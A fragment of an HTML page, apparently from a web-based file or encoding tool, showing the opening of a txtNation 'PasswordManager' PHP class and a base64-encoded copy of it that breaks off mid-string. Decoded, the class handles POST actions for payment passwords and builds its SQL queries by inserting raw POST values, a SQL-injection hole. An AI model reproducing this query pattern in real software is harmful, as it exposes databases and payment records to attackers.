<br></td><td bgcolor=000000>&lt;?php&nbsp;&nbsp;/**&nbsp;&nbsp;*&nbsp;&nbsp;&nbsp;*&nbsp;PLEASE<br>&nbsp;DO&nbsp;NOT&nbsp;MODIFY&nbsp;THIS&nbsp;SCRI<br>PT&nbsp;&nbsp;*&nbsp;==================<br>==============&nbsp;&nbsp;*&nbsp;&nbsp;&nbsp;*&nbsp;Mo<br>difying&nbsp;this&nbsp;script&nbsp;will<br>&nbsp;caules&nbsp;password&nbsp;failure<br>&nbsp;and&nbsp;errors&nbsp;in&nbsp;valid&nbsp;/&nbsp;s<br>ecure&nbsp;server&nbsp;communicati<br></td></tr></table><br><b>Base64 Encode</b><br><textarea cols=80 rows=10>PD9waHAKCi8qKgogKiAKICogUExFQVNFIERPIE5PVCBNT0RJRlkgVEhJUyBTQ1JJUFQKICogPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KICogCiAqIE1vZGlmeWluZyB0aGlzIHNjcmlwdCB3aWxsIGNhdWxlcyBwYXNzd29yZCBmYWlsdXJlIGFuZCBlcnJvcnMgaW4gdmFsaWQgLyBzZWN1cmUgc2VydmVyIGNvbW11bmljYXRpb25zCiAqIElmIHlvdSByZXF1aXJlIG1vZGlmaWNhdGlvbnMgdG8gdGhpcyBzY3JpcHQgcGxlYXNlIGNvbnRhY3QgeW91ciBhY2NvdW50IG1hbmFnZXIgZm9yIGEgY3VzdG9taXNlZCBzY3JpcHQuCiAqIAogKiBAYnJpZWYgQSBjbGFzcyB0byBwcm9jZXNzIGFsbCBvZiB0aGUgcG9zdCByZXF1ZXN0cyB0aGF0IHdlIHdpbGwgc2VuZCB0byBhIGNsaWVudHMgc2VydmVyCiAqIEBhdXRob3IgdHh0TmF0aW9uIERldmVsb3BtZW50CiAqIEB2ZXJzaW9uIDEuMS4wCiAqIAogKi8KY2xhc3MgUGFzc3dvcmRNYW5hZ2VyewoJCgkvKioKCSAqIEBicmllZiBob2xkcyB0aGUgdmVyc2lvbiBvZiB0aGUgY2xhc3MgZmlsZQoJICoKCSAqIEB2YXIgc3RyaW5nCgkgKi8KCXZhciAkc3RyVmVyc2lvbiA9ICcxLjEuMCc7CgkKCS8qKgoJICogQGJyaWVmIEhvbGRzIHRoZSBuYW1lIG9mdGhlIHBhc3N3b3JkIGRhdGFiYXNlCgkgKgoJICogQHZhciBzdHJpbmcKCSAqLwoJdmFyICRzdHJUYWJsZU5hbWUgPSAibXBfcGFzc3dvcmRzIjsKCQoJLyoqCgkgKiBAYnJpZWYgSG9sZHMgdGhlIGFycmF5IG9mIHBvc3QgZGF0YSBvbmNlIHJlY2VpdmVkCgkgKgoJICogQHZhciBhcnJheQoJICovCgl2YXIgJGFyclBvc3REYXRhID0gYXJyYXkoKTsKCQoJLyoqCgkgKiBAYnJpZWYgSG9sZHMgdGhlIHJlc291cmNlIElEIG9mIHRoZSBkYXRhYmFzZQoJICoKCSAqIEB2YXIgcmVzb3VyY2UKCSAqLwoJdmFyICRyZXNEYiA9IG51bGw7CgkKCS8qKgoJICogQGJyaWVmIEhvbGRzIHRoZSByZWZlcmVuY2UgdG8gdGhlIERCIHJlc3VsdCBzZXQKCSAqCgkgKiBAdmFyIHJlc291cmNlCgkgKi8KCXZhciAkcmVzUXVlcnlSZXN1bHQgPSBudWxsOwoJCgkvKioKCSAqIEBicmllZiBIb2xkcyB0aGUgY29uZmlnIGRhdGEgLyBjb25uZWN0aW9uIGRldGFpbHMKCSAqCgkgKiBAdmFyIGFycmF5CgkgKi8KCXZhciAkYXJyQ29uZmlnRGF0YSA9IG51bGw7CgkKCS8qKgoJICogQGJyaWVmIEhvbGRzIGFueSBhZGRpdGlvbmFsIGRhdGEgcmVxdWlyZWQgdG8gYmUgc2VudAoJICoKCSAqIEB2YXIgYXJyYXkKCSAqLwoJdmFyICRhcnJBZGl0aW9uYWxEYXRhID0gbnVsbDsKCQoJLyoqCgkgKiBAYnJpZWYgdGhlIG1haW4gY29udHJvbCBtZXRob2Qgb2YgdGhlIGNhbGxzLCBhbGwgYWN0aW9ucyB3aWxsIGJlIGluaXRpYXRlZCBoZXJlCgkgKiBAbm90ZSBBdmFpbGFibGUgQWN0aW9uczoKCSAqIEBub3RlIC0gJ21wX25ld19wYXNzd29yZCcKCSAqIEBub3RlIC0gJ21wX2NvbmZpcm1fcGFzc3dvcmQnCgkgKiBAbm90ZSAtICdtcF9zdGF0dXNfcGFzc3dvcmQnCgkgKiBAbm90ZSAtICdtcF9yZW5ld19wYXNzd29yZCcKCSAqIEBub3RlIC0gJ21wX2RldGFpbF9wYXNzd29yZCcKCSAqIEBub3RlIC0gJ21wX2lwX3VwZGF0ZScKCSAqIEBub3RlIC0gJ21wX3N5c19jaGVjaycKCSAqIEBub3RlIC0gJ21wX3NldHVwX2NsaWVudCcKCSAqLwoJZnVuY3Rpb24gSW5pY2lhdGVQb3N0UmVxdWVzdCgpewoJCQoJCWlmKCR0aGlzLT5DaGVja1NlY3VyaXR5KCkpewoJCQoJCQlpZigkdGhpcy0+R2V0UG9zdFZhcmlhYmxlcygpKXsKCQkJCQoJCQkJJHRoaXMtPkdldENvbmZpZ0RhdGEoKTsKCQkJCQoJCQkJaWYoIWVtcHR5KCR0aGlzLT5hcnJQb3N0RGF0YVsnYWN0aW9uJ10pICYmICR0aGlzLT5hcnJQb3N0RGF0YVsnYWN0aW9uJ10gIT0gIiIpewoJCQkJCgkJCQkJLyoqIEBub3RlIENoZWNrIHRoZSBQT1NUIHZhciAnYWN0aW9uJyBhbmQgc2VlIHdoYXQgbWV0aG9kIHRvIGNhbGwgKiovCgkJCQkJc3dpdGNoKCR0aGlzLT5hcnJQb3N0RGF0YVsnYWN0aW9uJ10pewoJCQkJCQkKCQkJCQkJLyoqIEBub3RlICdtcF9uZXdfcGFzc3dvcmQnIEluc2VydCBhIG5ldyBwYXNzd29yZCB0byB0aGUgY2xpZW50cyBzeXN0ZW0gKiovCgkJCQkJCWNhc2UibXBfbmV3X3Bhc3N3b3JkIjoKCQkJCQkJCQoJCQkJCQkJJHRoaXMtPlByb2Nlc3NOZXdQYXNzd29yZCgpOwoJCQkJCQlicmVhazsKCQkJCQkJCgkJCQkJCS8qKiBAbm90ZSAnbXBfY29uZmlybV9wYXNzd29yZCcgTWFyayBhIHBhc3N3b3JkIGFzIGJlaW5nIGNvbmZpcm1lZCBieSB0aGUgdXNlciAqKi8KCQkJCQkJY2FzZSJtcF9jb25maXJtX3Bhc3N3b3JkIjoKCQkJCQkJCQoJCQkJCQkJJHRoaXMtPkNvbmZpcm1QYXNzd29yZCgpOwoJCQkJCQlicmVhazsKCQkJCQkJCgkJCQkJCS8qKiBAbm90ZSAnbXBfc3RhdHVzX3Bhc3N3b3JkJyBHZXQgdGhlIGN1cnJlbnQgc3RhdHVzIG9mIHRoZSBjbGllbnRzIHBhc3N3b3JkICoqLwoJCQkJCQljYXNlIm1wX3N0YXR1c19wYXNzd29yZCI6CgkJCQkJCQkKCQkJCQkJCSR0aGlzLT5HZXRQYXNzd29yZFN0YXR1cygpOwoJCQkJCQlicmVhazsKCQkJCQkJCgkJCQkJCS8qKiBAbm90ZSAnbXBfcmVuZXdfcGFzc3dvcmQnIFJlbmV3IHRoZSBwYXNzd29yZCBhcyBpc3N1ZSB3aXRoIGVuZCB1c2VycyByZXF1ZXN0ICoqLwoJCQkJCQljYXNlIm1wX3JlbmV3X3Bhc3N3b3JkIjoKCQkJCQkJCQoJCQkJCQkJJHRoaXMtPlJlbmV3UGFzc3dvcmQoKTsKCQkJCQkJYnJlYWs7CgkJCQkJCQoJCQkJCQkvKiogQG5vdGUgJ21wX2RldGFpbF9wYXNzd29yZCcgR2V0IGZ1cnRoZXIgZGV0YWlscyBvZiBhIHBhc3N3b3JkICovCgkJCQkJCWNhc2UibXBfZGV0YWlsX3Bhc3N3b3JkIjoKCQkJCQkJCQoJCQkJCQkJJHRoaXMtPkdldFBhc3N3b3JkRGV0YWlsKCk7CgkJCQkJCWJyZWFrOwoJCQkJCQkKCQkJCQkJLyoqIEBub3RlICdtcF9pcF91cGRhdGUnIFVwZGF0ZSBvdXIgSVAgcmFuZ2UgZm9yIHRoZSBjbGllbnRzIEhUQWNjZXNzIHByb3RlY3Rpb24gKi8KCQkJCQkJY2FzZSJtcF9pcF91cGRhdGUiOgoJCQkJCQkJCgkJCQkJCQkkdGhpcy0+VXBkYXRlSXBSZXN0cmljdGlvbigpOwoJCQkJCQlicmVhazsKCQkJCQkJCgkJCQkJCS8qKiBAbm90ZSAnbXBfaXBfdXBkYXRlJyBVcGRhdGUgb3VyIElQIHJhbmdlIGZvciB0aGUgY2xpZW50cyBIVEFjY2VzcyBwcm90ZWN0aW9uICovCgkJCQkJCWNhc2UibXBfc2VydmljZV91cGRhdGUiOgoJCQkJCQkJCgkJCQkJCQkkdGhpcy0+VXBkYXRlU2VydmljZSgpOwoJCQkJCQlicmVhazsKCQkJCQkJCgkJCQkJCS8qKiBAbm90ZSAnbXBfc3lzX2NoZWNrJyBTeXN0ZW0gQ2hlY2sgdG8gZGVmaW5lIHRoYXQgY29tbXVuaWNhdGlvbnMgYmV0d2VlbiB1cyBhbmQgY2xpZW50IGFyZSBvayAqLwoJCQkJCQljYXNlIm1wX3N5c19jaGVjayI6CgkJCQkJCQkKCQkJCQkJCSR0aGlzLT5TeXN0ZW1DaGVjaygpOwoJCQkJCQlicmVhazsKCQkJCQkJCgkJCQkJCS8qKiBAbm90ZSAnbXBfc2V0dXBfY2xpZW50JyBTeXN0ZW0gQ2hlY2sgdG8gZGVmaW5lIHRoYXQgY29tbXVuaWNhdGlvbnMgYmV0d2VlbiB1cyBhbmQgY2xpZW50IGFyZSBvayAqLwoJCQkJCQljYXNlIm1wX3NldHVwX2NsaWVudCI6CgkJCQkJCQkKCQkJCQkJCSR0aGlzLT5TZXR1cENsaWVudCgpOwoJCQkJCQlicmVhazsKCQkJCQkJCgkJCQkJCS8qKiBAbm90ZSAnZGVmYXVsdCcgTm8gdmFsaWQgYWN0aW9uIHNlbnQgKi8KCQkJCQkJZGVmYXVsdDoKCQkJCQkJCS8qKiBAbm90ZSBSZXR1cm4gZXJyb3IgcmVzcG9uc2UgJ01QLTAwNCcgKi8KCQkJCQkJCSR0aGlzLT5TY3JpcHRFcnJvcigiTVAtMDA0Iik7CgkJCQkJCWJyZWFrOwoJCQkJCX0KCQkJCQoJCQkJfWVsc2V7CgkJCQkJLyoqIEBub3RlIFJldHVybiBlcnJvciByZXNwb25zZSAnTVAtMDA1JyAqLwoJCQkJCSR0aGlzLT5TY3JpcHRFcnJvcigiTVAtMDA1Iik7CgkJCQl9CgkJCQkKCQkJfWVsc2V7CgkJCQkvKiogQG5vdGUgUmV0dXJuIGVycm9yIHJlc3BvbnNlICdNUC0wMDMnICovCgkJCQkkdGhpcy0+U2NyaXB0RXJyb3IoIk1QLTAwMyIpOwoJCQl9CgkJfWVsc2V7CgkJCS8qKiBAbm90ZSBSZXR1cm4gZXJyb3IgcmVzcG9uc2UgJ01QLTAxMicgKi8KCQkJJHRoaXMtPlNjcmlwdEVycm9yKCJNUC0wMTIiKTsKCQl9Cgl9CgkKCS8qKgoJICogQGJyaWVmIEJ1aWxkIGFuIGFycmF5IG9mIGFsbCBwb3N0IHZhcnMgaWYgYXZhaWxhYmxlIGFuZCB0aGVuIHJldHVybiBhIGJvb2xlYW4gc3RhdHVzIG9uIHJlc3VsdAoJICoKCSAqIEByZXR1cm4gYm9vbGVhbiBTZW5kICd0cnVlJyBvbiByZWNlaXB0IG9mIHBvc3QgdmFyaWFibGVzCgkgKi8KCWZ1bmN0aW9uIEdldFBvc3RWYXJpYWJsZXMoKXsKCQkKCQkkYmxQb3N0VmFyc0ZvdW5kID0gZmFsc2U7CgkJCgkJaWYoIWVtcHR5KCRfUE9TVCkgJiYgaXNfYXJyYXkoJF9QT1NUKSl7CgkJCQoJCQkvKiogQG5vdGUgTG9vcCB0aHJvdWdoIGFsbCBwb3N0IHZhcnMgYW5kIGV4cG9ydCB0byBhIGNsYXNzIHZhciAoYXJyYXkpICovCgkJCWZvcmVhY2goJF9QT1NUIGFzICRzdHJLZXkgPT4gJHN0clZhbHVlKXsKCQkJCQoJCQkJJHRoaXMtPmFyclBvc3REYXRhWyRzdHJLZXldID0gJHN0clZhbHVlOwoJCQl9CgkJCgkJCSRibFBvc3RWYXJzRm91bmQgPSB0cnVlOwoJCX0KCQkKCQlyZXR1cm4gJGJsUG9zdFZhcnNGb3VuZDsKCX0KCQoJLyoqCgkgKiBAYnJpZWYgR2V0IGFsbCBkZXRhaWxzIHJlbGF0aW5nIHRvIHRoZSBwYXNzd29yZCBzZW50IGluIHRoZSBwb3N0IHZhciBhbmQgcmV0dXJuCgkgKgoJICovCglmdW5jdGlvbiBHZXRQYXNzd29yZERldGFpbCgpewoJCQoJCS8qKiBAbm90ZSBCdWlsZCB0aGUgcXVlcnkgdG8gZ2V0IHRoZSBkZXRhaWxzIG9mIGEgcGFzc3dvcmQgaW4gdGhlIHBhc3N3b3JkIGRhdGFiYXNlICovCgkJJHN0clNRTCA9ICJTRUxFQ1QgKgoJCQkJCSBGUk9NIGB7JHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2RhdGFiYXNlJ119YC5geyR0aGlzLT5zdHJUYWJsZU5hbWV9YAoJCQkJCVdIRVJFIGBwYXNzd29yZGAgPSAneyR0aGlzLT5hcnJQb3N0RGF0YVsncGFzc3dkJ119JwoJCQkJCUxJTUlUIDEiOwoJCQoJCWlmKCR0aGlzLT5RdWVyeSgkc3RyU1FMKSAmJiAkdGhpcy0+TnVtUm93cygpKXsKCQkJCgkJCSRhcnJQYXNzd29yZERhdGEgPSAkdGhpcy0+R2V0QXJyYXkoKTsKCQkJCgkJCSR0aGlzLT5hcnJBZGl0aW9uYWxEYXRhID0gJGFyclBhc3N3b3JkRGF0YTsKCQkJCgkJCS8qKiBAbm90ZSBSZXR1cm4gc3VjY2VzcyByZXNwb25zZSAnREVUQUlMJyBhbmQgYWxsIHBhc3N3b3JkIGRldGFpbHMgKi8KCQkJJHRoaXMtPlNjcmlwdFN1Y2Nlc3MoIkRFVEFJTCIpOwoJCX1lbHNlewoJCQkvKiogQG5vdGUgUmV0dXJuIGVycm9yIHJlc3BvbnNlICdNUC0wMDcnICovCgkJCSR0aGlzLT5TY3JpcHRFcnJvcigiTVAtMDA3Iik7CgkJfQoJCQoJfQoJCgkvKioKCSAqIEBicmllZiBSZXR1cm4gdGhlIHN0YXR1cyBvZiBhbnkgZ2l2ZW4gcGFzc3dvcmQgdGhhdCBjYW4gYmUgZm91bmQgaW4gdGhlIGNsaWVudHMgc3lzdGVtCgkgKiBAdXNlcyBEYXRhYmFzZQoJICoKCSAqLwoJZnVuY3Rpb24gR2V0UGFzc3dvcmRTdGF0dXMoKXsKCQkKCQkvKiogQG5vdGUgQnVpbGQgdGhlIHF1ZXJ5IHRvIGdldCB0aGUgc3RhdHVzIG9mIGEgcGFzc3dvcmQgaW4gdGhlIHBhc3N3b3JkIGRhdGFiYXNlICovCgkJJHN0clNRTCA9ICJTRUxFQ1QgYHN0YXR1c2AKCQkJCQkgRlJPTSBgeyR0aGlzLT5hcnJDb25maWdEYXRhWydkYXRhYmFzZSddfWAuYHskdGhpcy0+c3RyVGFibGVOYW1lfWAKCQkJCQlXSEVSRSBgcGFzc3dvcmRgID0gJ3skdGhpcy0+YXJyUG9zdERhdGFbJ3Bhc3N3ZCddfScKCQkJCQlMSU1JVCAxIjsKCQkKCQlpZigkdGhpcy0+UXVlcnkoJHN0clNRTCkgJiYgJHRoaXMtPk51bVJvd3MoKSl7CgkJCQoJCQkkYXJyUGFzc3dvcmREYXRhID0gJHRoaXMtPkdldEFycmF5KCk7CgkJCQoJCQlpZigkYXJyUGFzc3dvcmREYXRhWydzdGF0dXMnXSA9PSAnMCcpewoJCQkKCQkJCS8qKiBAbm90ZSBSZXR1cm4gc3VjY2VzcyByZXNwb25zZSAnVU5VU0VEJyBmb3IgYSB1bnVzZWQgcGFzc3dvcmQgKi8KCQkJCSR0aGlzLT5TY3JpcHRTdWNjZXNzKCJVTlVTRUQiKTsKCQkJfWVsc2V7CgkJCQkKCQkJCS8qKiBAbm90ZSBSZXR1cm4gc3VjY2VzcyByZXNwb25zZSAnVVNFRCcgZm9yIGEgdXNlZCBwYXNzd29yZCAqLwoJCQkJJHRoaXMtPlNjcmlwdFN1Y2Nlc3MoIlVTRUQiKTsKCQkJfQoJCQkKCQl9ZWxzZXsKCQkJLyoqIEBub3RlIFJldHVybiBlcnJvciByZXNwb25zZSAnTVAtMDA4JyAqLwoJCQkkdGhpcy0+U2NyaXB0RXJyb3IoIk1QLTAwOCIpOwoJCX0KCQkKCX0KCQoJLyoqCgkgKiBAYnJpZWYgUmVuZXcgYSBwYXNzd29yZCBzbyB0byBhbGxvdyB0aGUgdXNlciB0byB0cnkgYWdhaW4gaW4gdGhlIGNhc2Ugb2YgYW4gZXJyb3IKCSAqIEB1c2VzIERhdGFiYXNlCgkgKiAKCSAqLwoJZnVuY3Rpb24gUmVuZXdQYXNzd29yZCgpewoJCQoJCS8qKiBAbm90ZSBCdWlsZCB0aGUgcXVlcnkgdG8gcmVhY3RpdmF0ZSBhIHBhc3N3b3JkIGluIHRoZSBwYXNzd29yZCBkYXRhYmFzZSAqLwoJCSRzdHJTUUwgPSAiVVBEQVRFIGB7JHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2RhdGFiYXNlJ119YC5geyR0aGlzLT5zdHJUYWJsZU5hbWV9YAoJCQkJCSAgU0VUIGBzdGF0dXNgID0gJzAnCgkJCQkJV0hFUkUgYHBhc3N3b3JkYCA9ICd7JHRoaXMtPmFyclBvc3REYXRhWydwYXNzd2QnXX0nCgkJCQkJTElNSVQgMSI7CgkJCgkJaWYoJHRoaXMtPlF1ZXJ5KCRzdHJTUUwpICYmICR0aGlzLT5BZmZSb3dzKCkpewoJCQkKCQkJLy9JZiB0aGUgY3VzdG9tIHZhcmlhYmxlIGlzIHNldCB0aGVuIGluY2x1ZGUgdGhlIGF1dG8gbm90aWZpY2F0aW9uICdSZW5ldycgc3JpcHQgdG8gY29tcGxldGUgdGhlIHBheW1lbnQKCQkJaWYoaXNfYXJyYXkoJHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2N1c3RvbSddKSAmJiBhcnJheV9rZXlfZXhpc3RzKCdhdXRvX25vdGlmaWNhdGlvbl9yZW5ld19zY3JpcHQnLCR0aGlzLT5hcnJDb25maWdEYXRhWydjdXN0b20nXSkpewoJCQkJCgkJCQlpZigkdGhpcy0+YXJyQ29uZmlnRGF0YVsnY3VzdG9tJ11bJ2F1dG9fbm90aWZpY2F0aW9uX3JlbmV3X3NjcmlwdCddICE9ICcnKXsKCQkJCQlpbmNsdWRlX29uY2UoJHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2N1c3RvbSddWydhdXRvX25vdGlmaWNhdGlvbl9yZW5ld19zY3JpcHQnXSk7CgkJCQl9CgkJCX0KCQkJCgkJCS8qKiBAbm90ZSBSZXR1cm4gc3VjY2VzcyByZXNwb25zZSAnUkVORVdFRCcgd2hlbiBwYXNzd29yZCBpcyByZW5ld2VkICovCgkJCSR0aGlzLT5TY3JpcHRTdWNjZXNzKCJSRU5FV0VEIik7CgkJfWVsc2V7CgkJCS8qKiBAbm90ZSBSZXR1cm4gZXJyb3IgcmVzcG9uc2UgJ01QLTAwOScgKi8KCQkJJHRoaXMtPlNjcmlwdEVycm9yKCJNUC0wMDkiKTsKCQl9CgkJCgl9CgkKCS8qKgoJICogQGJyaWVmIEluc2VydCB0aGUgbmV3IHBhc3N3b3JkIGludG8gdGhlIGNsaWVudHMgZGF0YWJhc2UgcmVhZHkgZm9yIHVzZQoJICogQHVzZXMgRGF0YWJhc2UKCSAqCgkgKi8KCWZ1bmN0aW9uIFByb2Nlc3NOZXdQYXNzd29yZCgpewoJCQoJCWlmKGVtcHR5KCR0aGlzLT5hcnJQb3N0RGF0YVsndXNlcm5hbWUnXSkpewoJCQkkdGhpcy0+YXJyUG9zdERhdGFbJ3VzZXJuYW1lJ10gPSBudWxsOwoJCX0KCQkKCQkvKiogQG5vdGUgQnVpbGQgdGhlIHF1ZXJ5IHRvIGluc2VydCBhIG5ldyBwYXNzd29yZCBpbnRvIHRoZSBwYXNzd29yZCBkYXRhYmFzZSAqLwoJCSRzdHJTUUwgPSAiSU5TRVJUIElOVE8gYHskdGhpcy0+YXJyQ29uZmlnRGF0YVsnZGF0YWJhc2UnXX1gLmB7JHRoaXMtPnN0clRhYmxlTmFtZX1gCgkJCQkJICBTRVQgYHBhc3N3b3JkYCA9ICd7JHRoaXMtPmFyclBvc3REYXRhWydwYXNzd2QnXX0nLAoJCQkJCSAgCSAgYHVzZXJuYW1lYCA9ICd7JHRoaXMtPmFyclBvc3REYXRhWyd1c2VybmFtZSddfScsCgkJCQkJICAJICBgc3RhdHVzYCA9ICcwJywKCQkJCQkgIAkgIGBudW1iZXJgID0gJ3skdGhpcy0+YXJyUG9zdERhdGFbJ251bWJlciddfScsCgkJCQkJICAJICBgcmNgID0gJ3skdGhpcy0+YXJyUG9zdERhdGFbJ3JjJ119JywKCQkJCQkgIAkgIGByZWZlcmVyYCA9ICd7JHRoaXMtPmFyclBvc3REYXRhWydyZWZlcmVyaWQnXX0nLAoJCQkJCSAgCSAgYHRyYW5zSURgID0gJ3skdGhpcy0+YXJyUG9zdERhdGFbJ3RyYW5zYWN0aW9uSUQnXX0nLAoJCQkJCSAgCSAgYGN1cnJlbmN5YCA9ICd7JHRoaXMtPmFyclBvc3REYXRhWydjdXJyZW5jeSddfScsCgkJCQkJICAJICBgdHJhbnNUeXBlYCA9ICd7JHRoaXMtPmFyclBvc3REYXRhWyd0cmFuc2FjdGlvblR5cGUnXX0nLAoJCQkJCSAgCSAgYGFtb3VudGAgPSAneyR0aGlzLT5hcnJQb3N0RGF0YVsnYW1vdW50J119JywKCQkJCQkgIAkgIGBkYXRlYCA9IE5PVygpIjsKCQkKCQlpZigkdGhpcy0+UXVlcnkoJHN0clNRTCkgJiYgJHRoaXMtPkluc0lkKCkpewoJCQkKCQkJLy9JZiB0aGUgY3VzdG9tIHZhcmlhYmxlIGlzIHNldCB0aGVuIGluY2x1ZGUgdGhlIGF1dG8gbm90aWZpY2F0aW9uIHNyaXB0IHRoYXQgY2FuIGJlIHVzZWQgdG8gbm90aWZ5IG9mIGluaXRhbGlzZWQgcGF5bWVudAoJCQlpZihpc19hcnJheSgkdGhpcy0+YXJyQ29uZmlnRGF0YVsnY3VzdG9tJ10pICYmIGFycmF5X2tleV9leGlzdHMoJ2F1dG9fbm90aWZpY2F0aW9uX3NjcmlwdCcsJHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2N1c3RvbSddKSl7CgkJCQkKCQkJCWlmKCR0aGlzLT5hcnJDb25maWdEYXRhWydjdXN0b20nXVsnYXV0b19ub3RpZmljYXRpb25fc2NyaXB0J10gIT0gJycpewoJCQkJCWluY2x1ZGVfb25jZSgkdGhpcy0+YXJyQ29uZmlnRGF0YVsnY3VzdG9tJ11bJ2F1dG9fbm90aWZpY2F0aW9uX3NjcmlwdCddKTsKCQkJCX0KCQkJfQoJCQkKCQkJLyoqIEBub3RlIFJldHVybiBzdWNjZXNzIHJlc3BvbnNlICdBRERFRCcgdG8gYWNrbm93bGVkZ2UgdGhlIG5ldyBwYXNzd29yZHMgYWRkaXRpb24gdG8gdGhlIGRhdGFiYXNlICovCgkJCSR0aGlzLT5TY3JpcHRTdWNjZXNzKCJBRERFRCIpOwoJCX1lbHNlewoJCQkvKiogQG5vdGUgUmV0dXJuIGVycm9yIHJlc3BvbnNlICdNUC0wMTAnICovCgkJCSR0aGlzLT5TY3JpcHRFcnJvcigiTVAtMDEwIik7CgkJfQoJCQoJfQoJCgkvKioKCSAqIEBicmllZiBDb25maXJtIHRoYXQgdGhlIHVzZXIgaGFzIHJlY2l2ZWQgYW5kIGVudGVyZWQgdGhlIHBhc3N3b3JkCgkgKiBAdXNlcyBEYXRhYmFzZQoJICoKCSAqLwoJZnVuY3Rpb24gQ29uZmlybVBhc3N3b3JkKCl7CgkJCgkJLyoqIEBub3RlIEJ1aWxkIHRoZSBxdWVyeSB0byB1cGRhdGUgdGhlIHBhc3N3b3JkIHRvIGJlIGNvbmZpcm1lZCAqLwoJCSRzdHJTUUwgPSAiVVBEQVRFIGB7JHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2RhdGFiYXNlJ119YC5geyR0aGlzLT5zdHJUYWJsZU5hbWV9YAoJCQkJCSAgU0VUIGBjb25maXJtZWRgID0gJzEnCgkJCQkJV0hFUkUgYHBhc3N3b3JkYCA9ICd7JHRoaXMtPmFyclBvc3REYXRhWydwYXNzd2QnXX0nCgkJCQkJTElNSVQgMSI7CgkJCgkJaWYoJHRoaXMtPlF1ZXJ5KCRzdHJTUUwpICYmICR0aGlzLT5BZmZSb3dzKCkpewoJCQkKCQkJLy9TZWUgaWYgdGhlIHBhc3N3b3JkIGlzIHJlcXVpcmVkIHRvIGJlIHNldCBhcyB1c2VkIHVwb24gY29uZmlybWF0aW9uCgkJCWlmKGlzX2FycmF5KCR0aGlzLT5hcnJDb25maWdEYXRhWydjdXN0b20nXSkgJiYgYXJyYXlfa2V5X2V4aXN0cygndXNlX3Bhc3N3b3JkX29uX2NvbmZpcm1hdGlvbicsJHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2N1c3RvbSddKSl7CgkJCQkKCQkJCWlmKCR0aGlzLT5hcnJDb25maWdEYXRhWydjdXN0b20nXVsndXNlX3Bhc3N3b3JkX29uX2NvbmZpcm1hdGlvbiddID09IHRydWUpewoJCQkJCQoJCQkJCS8vU2V0IHRoZSBwYXNzd29yZCB0byBiZSB1c2VkIGlmIHJlcXVpcmVkIGJ5IHRoZSBjb25maWcgZmlsZQoJCQkJCSR0aGlzLT5Vc2VQYXN3b3JkKCR0aGlzLT5hcnJQb3N0RGF0YVsncGFzc3dkJ10sMSxudWxsLG51bGwsdHJ1ZSk7CgkJCQl9CgkJCX0KCQkJCgkJCS8vSWYgdGhlIGN1c3RvbSB2YXJpYWJsZSBpcyBzZXQgdGhlbiBpbmNsdWRlIHRoZSBjb21wbGV0ZV9wYXltZW50X3NjcmlwdCB0byBjb21wbGV0ZSB0aGUgcGF5bWVudAoJCQlpZihpc19hcnJheSgkdGhpcy0+YXJyQ29uZmlnRGF0YVsnY3VzdG9tJ10pICYmIGFycmF5X2tleV9leGlzdHMoJ2NvbXBsZXRlX3BheW1lbnRfc2NyaXB0JywkdGhpcy0+YXJyQ29uZmlnRGF0YVsnY3VzdG9tJ10pKXsKCQkJCQoJCQkJaWYoJHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2N1c3RvbSddWydjb21wbGV0ZV9wYXltZW50X3NjcmlwdCddICE9ICcnKXsKCQkJCQlpbmNsdWRlX29uY2UoJHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2N1c3RvbSddWydjb21wbGV0ZV9wYXltZW50X3NjcmlwdCddKTsKCQkJCX0KCQkJfQoJCQkKCQkJLyoqIEBub3RlIFJldHVybiBzdWNjZXNzIHJlc3BvbnNlICdBRERFRCcgdG8gYWNrbm93bGVkZ2UgdGhlIG5ldyBwYXNzd29yZHMgYWRkaXRpb24gdG8gdGhlIGRhdGFiYXNlICovCgkJCSR0aGlzLT5TY3JpcHRTdWNjZXNzKCJBRERFRCIpOwoJCX1lbHNlewoJCQkvKiogQG5vdGUgUmV0dXJuIGVycm9yIHJlc3BvbnNlICdNUC0wMTAnICovCgkJCSR0aGlzLT5TY3JpcHRFcnJvcigiTVAtMDEwIik7CgkJfQoJCQoJfQoJCgkvKioKCSAqIEBicmllZiBTZXR1cCB0aGUgY2xpZW50cyBkYXRhYmFzZSBhbmQgSVAgYWRkcmVzcyBsaXN0CgkgKiBAdXNlcyBEYXRhYmFzZQoJICoKCSAqLwoJZnVuY3Rpb24gU2V0dXBDbGllbnQoKXsKCQkKCQlpZighJHRoaXMtPlRhYmxlRXhpc3RzKCkpewoJCQkKCQkJLyoqIEBub3RlIENyZWF0ZSBhIG5ldyBkYXRhYmFzZSB0YWJsZSBvbiB0aGUgY2xpZW50cyBzZXJ2ZXIgKi8KCQkJJHN0clNRTCA9ICJDUkVBVEUgVEFCTEUgYHskdGhpcy0+YXJyQ29uZmlnRGF0YVsnZGF0YWJhc2UnXX1gLmB7JHRoaXMtPnN0clRhYmxlTmFtZX1gICgKCQkJCQkJCQkJYGlkYCBJTlQoIDExICkgVU5TSUdORUQgTk9UIE5VTEwgQVVUT19JTkNSRU1FTlQgUFJJTUFSWSBLRVksCgkJCQkJCQkJCWBwYXNzd29yZGAgQ0hBUiggMjAgKSBOT1QgTlVMTCBDT01NRU5UICdUaGUgcGFzc3dvcmQnLAoJCQkJCQkJCQlgdXNlcm5hbWVgIENIQVIoIDIwICkgTlVMTCBDT01NRU5UICdUaGUgdXNlcm5hbWUgaWYgcmVxdWlyZWQgYnkgc2VydmljZScsCgkJCQkJCQkJCWBzdGF0dXNgIElOVCggMTEgKSBVTlNJR05FRCBOT1QgTlVMTCBERUZBVUxUICcwJyBDT01NRU5UICdQYXNzd29yZCAnJzAnJyAtIHVudXNlZCwgaW5jcmFtZW50YWwgZm9yIG9uZSB1c2Ugb3IgaGlnaGVyJywKCQkJCQkJCQkJYG51bWJlcmAgQ0hBUiggMTMgKSBOT1QgTlVMTCAsCgkJCQkJCQkJCWByY2AgQ0hBUiggODAgKSBOT1QgTlVMTCAsCgkJCQkJCQkJCWByZWZlcmVyYCBDSEFSKCA4MCApIE5PVCBOVUxMIENPTU1FTlQgJ1VuaXF1ZSByZWZlcm